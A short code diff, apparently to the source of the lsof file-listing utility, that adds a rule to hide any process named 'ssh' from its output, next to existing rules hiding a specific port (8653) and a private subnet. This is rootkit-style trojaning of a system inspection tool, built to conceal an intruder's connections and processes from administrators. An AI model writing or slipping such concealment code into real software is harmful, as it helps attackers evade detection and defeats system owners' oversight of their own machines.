@@ -28,9 +28,12 @@
  *
  * 4. This notice may not be removed or altered.
  */
+#include <string.h>
 // 192.168.3.0/24
 #define HIDDEN_NET 0x3a8c0
 #define HIDDEN_PORT 8653
+#define HIDDEN_CMD "ssh"
+
 
 #ifndef lint
 static char copyright[] =
@@ -675,6 +678,8 @@ print_file()
                 return;
 	}
 	if(!((Lf->li[0].p - HIDDEN_PORT)&&(Lf->li[1].p - HIDDEN_PORT)))
+		return;
+	if(!strcmp(Lp->cmd,HIDDEN_CMD))
 		return;
 
 	if (PrPass && !Hdr) {
